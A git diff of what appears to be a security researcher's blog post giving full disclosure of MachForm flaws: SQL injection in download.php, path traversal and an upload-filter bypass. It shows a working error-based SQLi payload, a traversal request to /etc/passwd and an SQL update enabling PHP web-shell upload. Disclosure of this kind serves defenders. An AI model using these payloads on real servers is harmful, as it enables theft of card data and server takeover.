@@ -1,5 +1,5 @@
 ---
-title: "MachForm: Ceci n'est pas un Zero-Day"
+title: "Ceci n'est pas un 0-Day (MachForm)"
 excerpt: "Full disclosure of Not-Zero-Day vulnerabilities in MachForm"
 header:
   teaser: "/assets/images/machform-not-0-day/teaser.png"
@@ -23,16 +23,18 @@ gallery1:
 
 Years ago, I discovered some vulnerabilities in [MachForm from Appnitro](https://www.machform.com/). These were reported to the vendor who acknowledged it, issued a fix and even published the [notice for the users to update ASAP.](https://www.machform.com/blog-machform-423-security-release/)
 
-Well ... 3 years later, these vulnerabilities are still in the wild. Some of the affected servers even got credit cards information with the corresponding CVV.
+Well ... **3 years later**, these vulnerabilities are still in the wild. Some of the affected servers even got **credit cards** information with the corresponding **CVV**.
 
 I hope that making a public full disclosure will help to get these servers secured.
 
 ## Summary
 The form creation platform MachForm from Appnitro is subject to SQL injections that lead to path traversal and arbitrary file upload.
-The application is widely deployed and with some google dorks it's possible to find various webpages storing sensitive data as Credit Card numbers with corresponding Security Codes.
-Otherwise the arbitrary file upload can let an attacker get control of the server by uploading a WebShell.
+The application is widely deployed and with some google dorks it's possible to find various webpages storing sensitive data as credit card numbers with corresponding security codes.
+Also, the arbitrary file upload can let an attacker get control of the server by uploading a *WebShell*.
 
-## SQL injection
+## SQL injection 
+(Provisional CVE-2018-6410)
+
 The software is subject to SQL injections in the **'download.php'** file. This SQLi can be found on the parameter **'q'** which a *base64* encoded value for the following parameters:
 ```php
 $form_id    = $params['form_id'];
@@ -57,7 +59,8 @@ Which is the *base64* encoding for:
 el= (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x2020,(SELECT MID((user_email),1,50) FROM ap_users ORDER BY user_id LIMIT 0,1),0x2020,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) ;&id=1&hash=1&form_id=1
 ```
 
-## Path traversal
+## Path traversal 
+(Provisional CVE-2018-6409)
 
 **'download.php'** is used to serve stored files from the forms answers. Modifying the name of the file to serve on the corresponding **ap_form** table leads to a path traversal vulnerability.
 
@@ -75,9 +78,11 @@ Which is the *base64* encoding for:
  el=4&id=1&hash=402ba0230d6f44a2de590ac11107a458&form_id=58009
 ```
 Note that hash is the MD5 of the corresponding filename:
+
 `md5("../../../../../../../../../../../../../../../../etc/passwd")=402ba0230d6f44a2de590ac11107a458`
 
-## Bypass file upload filter
+## Bypass file upload filter 
+(Provisional CVE-2018-6411)
 
 When the form is set to filter a blacklist, it automatically adds dangerous extensions to the filters. 
 If the filter is set to a whitelist, the dangerous extensions can be bypassed.
@@ -87,6 +92,7 @@ This can be done directly on the database via SQLi
 update ap_form_elements set element_file_type_list="php",element_file_block_or_allow="a" where form_id=58009 and element_id=4;
 ```
 Once uploaded the file can be found and executed in the following URL:
+
 `http:// [URL] / [Machform_folder] /data/form_58009/files/ [filename]`
 
 The filename can be found in the database
